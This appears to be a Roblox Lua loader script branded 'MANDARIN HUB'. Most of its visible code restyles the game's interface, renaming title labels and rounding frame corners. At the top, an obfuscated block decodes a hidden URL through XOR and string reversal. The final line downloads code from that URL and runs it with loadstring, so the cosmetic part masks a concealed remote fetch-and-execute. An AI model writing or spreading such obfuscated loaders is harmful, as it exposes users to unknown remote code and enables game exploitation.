
--[[ STAGE 2: VISUAL CORE ]]
local nvLwYu9kovSdfoyW="\086\021\050\040\114\071\127\125\141\145\105\111\161\127\180\138\195\150\159\216\216\181\230\194\247\001\003\016\231\237\035\042\046\052\066\071\077\089\087\100\101\114\072\073\067\077\083\069\166\111\116\135\195\132\145\161\153\166\172\191\183\203\196\201\227\215\235\230\248\001\065\002\010\027\036\099\106\102\052\062\065\072\091"local FxJ40FEE0hBQCO1=223 local uqzsa1aFSa684u=73 local wOYiv6og9hHaDa4R=0 local EjLEDM1QTyFku46BDvGq=7 local j53RpuvdJY4ihZ4yY2=22 local aI18lEl4HA_VTiPxN1s=true local tsXSf_7XKspywxBeq4rdNN=bit32 and bit32.bxor if not tsXSf_7XKspywxBeq4rdNN then tsXSf_7XKspywxBeq4rdNN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Ko2SFaHR9cTd={}for jXD8LlvZ2hOMu5=1,#nvLwYu9kovSdfoyW do local OLt0n0jJgEU9CDgBQ_Q=string.byte(nvLwYu9kovSdfoyW,jXD8LlvZ2hOMu5)local k7XUFykGVrGX=(uqzsa1aFSa684u+(jXD8LlvZ2hOMu5*EjLEDM1QTyFku46BDvGq)+j53RpuvdJY4ihZ4yY2)%256 if wOYiv6og9hHaDa4R==0 then OLt0n0jJgEU9CDgBQ_Q=(OLt0n0jJgEU9CDgBQ_Q-k7XUFykGVrGX)%256 Ko2SFaHR9cTd[jXD8LlvZ2hOMu5]=string.char(tsXSf_7XKspywxBeq4rdNN(OLt0n0jJgEU9CDgBQ_Q,FxJ40FEE0hBQCO1))else OLt0n0jJgEU9CDgBQ_Q=tsXSf_7XKspywxBeq4rdNN(OLt0n0jJgEU9CDgBQ_Q,FxJ40FEE0hBQCO1)Ko2SFaHR9cTd[jXD8LlvZ2hOMu5]=string.char((OLt0n0jJgEU9CDgBQ_Q-k7XUFykGVrGX)%256)end end local mxqWzV6ryDJCY3UPDi6A=table.concat(Ko2SFaHR9cTd)if aI18lEl4HA_VTiPxN1s then mxqWzV6ryDJCY3UPDi6A=string.reverse(mxqWzV6ryDJCY3UPDi6A)end local PCRs0ieVSPhwr8swkG=mxqWzV6ryDJCY3UPDi6A
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(PCRs0ieVSPhwr8swkG))()
